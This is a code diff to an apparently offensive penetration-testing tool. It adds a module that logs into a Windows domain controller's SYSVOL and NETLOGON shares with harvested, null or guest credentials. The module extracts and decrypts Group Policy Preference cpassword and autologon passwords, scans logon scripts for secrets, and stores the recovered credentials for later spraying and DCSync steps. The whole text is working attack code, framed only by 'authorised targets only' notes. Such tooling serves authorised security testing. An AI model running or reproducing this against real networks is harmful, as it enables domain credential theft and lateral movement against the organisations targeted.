@@ -2223,6 +2223,20 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ae) smb-gpp: creds recovered from SYSVOL/NETLOGON GPP (domain-wide, reusable) → high
+    if sid == "smb-gpp":
+        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
+        if creds:
+            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"GPP creds: {shown}"[:140]}
+        if secrets:
+            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"SYSVOL secrets: {shown}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2883,7 +2897,9 @@ _EXPLOIT_STEPS = {
         ("Recursively read every readable share; grep contents for creds, keys, configs, "
          "backups & GPP cpassword (read-only, in-memory)",
          "smb-loot"),
-        "SYSVOL / NETLOGON → GPP cpassword (Groups.xml), logon scripts, unattend.xml",
+        ("SYSVOL / NETLOGON → GPP cpassword (all GPP XML), autologin (registry.xml), logon "
+         "scripts & unattend.xml — authenticated, DC-targeted",
+         "smb-gpp"),
         # ── poison & relay (no creds) ──
         "Poison LLMNR / NBT-NS / mDNS → capture NetNTLMv1/v2 → crack or relay",
         "SMB signing 'not required' → NTLM relay to SMB / LDAP / ADCS-ESC8 (ntlmrelayx)",
@@ -8799,6 +8815,208 @@ def _tool_smb_loot(ip: str, port: int, proto: str) -> str:
     return f"SMB share loot — {ip}:{port}/{proto}  (read-only, in-memory grep)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 4: SYSVOL / NETLOGON GPP loot (authenticated, DC-targeted) ────────
+_SMBGPP_DEADLINE = 300           # s — hard wall-clock cap
+# SYSVOL/NETLOGON files worth reading — all GPP XML types, autologin, logon scripts, unattend
+_SMB_GPP_RE = re.compile(
+    r"(?i)(?:groups|services|scheduledtasks|datasources|printers|drives|registry)\.xml$|"
+    r"unattend\.xml$|sysprep\.(?:inf|xml)$|\.(?:bat|cmd|ps1|psm1|vbs|kix)$")
+
+
+def _looks_ip(s: str) -> bool:
+    try:
+        ipaddress.ip_address(s)
+        return True
+    except ValueError:
+        return False
+
+
+def _gather_smb_creds(ip: str, port: str, proto: str) -> list:
+    """(domain, user, pass) creds harvested earlier — GPP loot (smb-creds) and any manual
+    creds (manual-creds) recorded for this host. Feeds authenticated SMB steps."""
+    out, seen = [], set()
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid in ("smb-creds", "manual-creds"):
+            for m in re.finditer(r"! (\S+?):(\S*) @ .+?\[([^\]]+)\]", output or ""):
+                dom = m.group(3)
+                if dom == ip or _looks_ip(dom):
+                    dom = ""                     # an IP isn't a domain → workgroup/local auth
+                pw = "" if m.group(2) == "<blank>" else m.group(2)
+                key = (dom.lower(), m.group(1).lower(), pw)
+                if key not in seen:
+                    seen.add(key)
+                    out.append((dom, m.group(1), pw))
+    return out
+
+
+def _smb_gpp_attempts(ip: str, port: str, proto: str) -> list:
+    """(domain, user, pass, label) auth attempts: harvested creds first, then null & guest."""
+    attempts = [(dom, user, pw, f"{dom}\\{user}" if dom else user)
+                for dom, user, pw in _gather_smb_creds(ip, port, proto)]
+    attempts.append(("", "", "", "null session"))
+    attempts.append(("", "guest", "", "guest"))
+    return attempts
+
+
+def _smb_auth_smbclient(dom: str, user: str, pw: str) -> list:
+    """smbclient auth args for a cred (null → -N)."""
+    if not user:
+        return ["-N"]
+    who = f"{dom}\\{user}" if dom else user
+    return ["-U", f"{who}%{pw}"]
+
+
+def _smb_auth_nxc(dom: str, user: str, pw: str) -> list:
+    """netexec auth args for a cred."""
+    args = ["-u", user or "", "-p", pw or ""]
+    if dom:
+        args += ["-d", dom]
+    return args
+
+
+def _smb_walk_grep(smbclient: str, ip: str, share: str, auth: list, deadline: float) -> tuple:
+    """Walk one SYSVOL/NETLOGON share, grep GPP/autologin/secret content in memory (files
+    fetched to a temp path, read, deleted). Returns (creds, secrets, inv)."""
+    import tempfile
+    import time
+    creds, secrets, inv = [], [], []
+    listing = _smb_recurse_ls(smbclient, ip, share, auth)
+    if not listing:
+        return creds, secrets, inv
+    tmpdir = tempfile.mkdtemp(prefix="pshunter_smb_")
+    try:
+        for path, size in listing:
+            if not _SMB_GPP_RE.search(path):
+                continue
+            inv.append((share, path, size))
+            if time.time() > deadline or size == 0 or size > _SMBLOOT_MAX_FILE:
+                continue
+            data = _smb_fetch(smbclient, ip, share, path, auth, tmpdir)
+            if not data:
+                continue
+            text = data.decode("utf-8", "ignore")
+            loc = f"{share}\\{path}"
+            for mm in re.finditer(r'cpassword\s*=\s*"?([A-Za-z0-9+/=]{8,})"?', text):
+                pw = _smb_gpp_decrypt(mm.group(1))
+                um = re.search(r'(?:userName|newName|accountName|runAs)\s*=\s*"([^"]+)"', text)
+                who = (um.group(1) if um else "unknown")
+                dom = who.split("\\")[0] if "\\" in who else ""
+                if pw:
+                    creds.append((dom, who.split("\\")[-1], pw, f"GPP cpassword @ {loc}"))
+                else:
+                    secrets.append(f"cpassword blob @ {loc} (gpp-decrypt missing)")
+            am = re.search(r'DefaultPassword[^>]*value="([^"]+)"', text)
+            if am:
+                au = re.search(r'DefaultUserName[^>]*value="([^"]+)"', text)
+                who = au.group(1) if au else "autologon"
+                dom = who.split("\\")[0] if "\\" in who else ""
+                creds.append((dom, who.split("\\")[-1], am.group(1), f"GPP autologin @ {loc}"))
+            for label, _snip in _smb_grep_secrets(text):
+                secrets.append(f"{label} @ {loc}")
+    finally:
+        try:
+            os.rmdir(tmpdir)
+        except OSError:
+            pass
+    return creds, secrets, inv
+
+
+def _parse_gpp_module(out: str) -> list:
+    """(user, pass) pairs from a netexec gpp_password / gpp_autologin module run."""
+    users = re.findall(r"[Uu]sername:\s*(\S+)", out)
+    passwds = re.findall(r"[Pp]assword:\s*(\S+)", out)
+    return [(u, p) for u, p in zip(users, passwds) if p and p.lower() != "none"]
+
+
+def _tool_smb_gpp(ip: str, port: int, proto: str) -> str:
+    """SMB step 4 tool: loot the DC's SYSVOL / NETLOGON for GPP cpassword (all GPP XML
+    types), GPP autologin (registry.xml), and secrets in logon scripts / unattend.xml.
+    Authenticated & DC-targeted: tries harvested creds (smb-creds / manual-creds) first,
+    then null / guest. netexec runs its gpp_password + gpp_autologin modules; smbclient
+    walks the shares and greps in memory (files fetched to a temp path, read, deleted —
+    no loot on disk). Recovered creds are decrypted and stored. Read-only. A host with no
+    SYSVOL/NETLOGON (not a DC) or no accepted session raises. Authorised targets only."""
+    import time
+    deadline = time.time() + _SMBGPP_DEADLINE
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    smbclient = shutil.which("smbclient")
+    if not nxc and not smbclient:
+        raise RuntimeError("no SMB tooling found — install netexec and/or smbclient")
+    attempts = _smb_gpp_attempts(ip, port, proto)
+
+    creds_all, secrets_all, inv_all = [], [], []
+    used, is_dc = None, False
+
+    if smbclient:                                # find a session that can reach SYSVOL/NETLOGON
+        for dom, user, pw, label in attempts:
+            if time.time() > deadline:
+                break
+            auth = _smb_auth_smbclient(dom, user, pw)
+            _, lo = _smb_run([smbclient, "-L", f"//{ip}/"] + auth, 40)
+            shares = re.findall(r"^\s+(\S+)\s+Disk\b", lo, re.M)
+            dc_shares = [s for s in shares if s.upper() in ("SYSVOL", "NETLOGON")]
+            if not dc_shares:
+                continue
+            is_dc, used = True, label
+            for share in dc_shares:
+                c, s, i = _smb_walk_grep(smbclient, ip, share, auth, deadline)
+                creds_all += c
+                secrets_all += s
+                inv_all += i
+            break
+
+    if nxc:                                      # authoritative GPP modules (decrypt for us)
+        for dom, user, pw, label in attempts:
+            if time.time() > deadline:
+                break
+            base = [nxc, "smb", ip] + _smb_auth_nxc(dom, user, pw)
+            authed = False
+            for mod in ("gpp_password", "gpp_autologin"):
+                _, out = _smb_run(base + ["-M", mod], 90)
+                if re.search(r"\b445\b.*\[\+\]", out):
+                    authed, is_dc = True, True
+                for u, p in _parse_gpp_module(out):
+                    creds_all.append((u.split("\\")[0] if "\\" in u else "",
+                                      u.split("\\")[-1], p, f"nxc {mod}"))
+            if authed:
+                used = used or label
+                break
+
+    if not is_dc:
+        raise RuntimeError(f"{ip}:{port} — no SYSVOL/NETLOGON reachable "
+                           "(not a DC, or valid domain creds are needed)")
+
+    seen, creds = set(), []                      # dedup creds by (user, pass)
+    for dom, user, pw, src in creds_all:
+        k = (user.lower(), pw)
+        if k not in seen:
+            seen.add(k)
+            creds.append((dom, user, pw, src))
+    if creds:                                    # persist for later exec/spray/dcsync steps
+        blocks = _load_manual_block(ip, port, proto, "smb-creds")
+        for dom, user, pw, src in creds:
+            host = dom or ip
+            line = f"! {user}:{pw or '<blank>'} @ {src} [{host}]"
+            blocks.setdefault(host, [])
+            if line not in blocks[host]:
+                blocks[host].append(line)
+        _save_manual_block(ip, port, proto, "smb-creds", blocks)
+
+    secrets = list(dict.fromkeys(secrets_all))
+    lines = [f"[*] Auth: {used}   SYSVOL/NETLOGON looted"]
+    for dom, user, pw, src in creds:
+        who = f"{dom}\\{user}" if dom else user
+        lines.append(f"✗ CRED {who}:{pw} ({src})")
+    for desc in secrets:
+        lines.append(f"✗ SECRET {desc}")
+    for share, path, size in inv_all[:40]:
+        lines.append(f"· FILE {share}\\{path} ({size} b)")
+    if len(inv_all) > 40:
+        lines.append(f"· … +{len(inv_all) - 40} more files")
+    lines.append(f"\n[*] {len(inv_all)} GPP/script files · {len(creds)} cred(s) · {len(secrets)} secret(s)")
+    return f"SYSVOL / NETLOGON GPP loot — {ip}:{port}/{proto}  (read-only)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -8831,6 +9049,7 @@ _STEP_TOOLS = {
     "smb-enum": ("SMB null/guest enum (netexec → shares/users/pol + OS/domain/signing)", _tool_smb_enum),
     "smb-vuln": ("SMB version-RCE scan (nmap NSE + netexec, detection only)", _tool_smb_vuln),
     "smb-loot": ("SMB share loot (smbclient, read-only, in-memory grep → creds/secrets)", _tool_smb_loot),
+    "smb-gpp": ("SYSVOL/NETLOGON GPP loot (netexec + smbclient, creds-aware, DC)", _tool_smb_gpp),
 }
 
 def _mins(seconds: int) -> str:
@@ -8878,6 +9097,7 @@ _STEP_TOOL_RUNS = {
     "smb-enum":         ("netexec / smbclient+rpcclient+nmap", f"{_mins(_SMBENUM_DEADLINE)} min"),
     "smb-vuln":         ("nmap NSE + netexec", f"{_mins(_SMBVULN_DEADLINE)} min"),
     "smb-loot":         ("smbclient + gpp-decrypt", f"{_mins(_SMBLOOT_DEADLINE)} min"),
+    "smb-gpp":          ("netexec + smbclient", f"{_mins(_SMBGPP_DEADLINE)} min"),
 }
 
 
@@ -9039,6 +9259,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-gpp":                     # authenticated DC loot, creds-aware
+        ncreds = len(_gather_smb_creds(ip, port, proto))
+        src = f"{ncreds} harvested cred(s) + null/guest" if ncreds else "null/guest only"
+        print(f"{DIM}   SYSVOL/NETLOGON GPP loot via {BOLD}netexec + smbclient{RESET}{DIM} — read-only, "
+              f"tries {src} · secrets grepped in memory · deadline {_SMBGPP_DEADLINE // 60} min{RESET}")
     if tool_key == "smb-loot":                    # read-only looting, files grepped in memory
         print(f"{DIM}   read-only share looting via {BOLD}smbclient{RESET}{DIM} — files fetched to a "
               f"temp path, grepped in memory, then deleted (no loot on disk) · secrets + GPP "
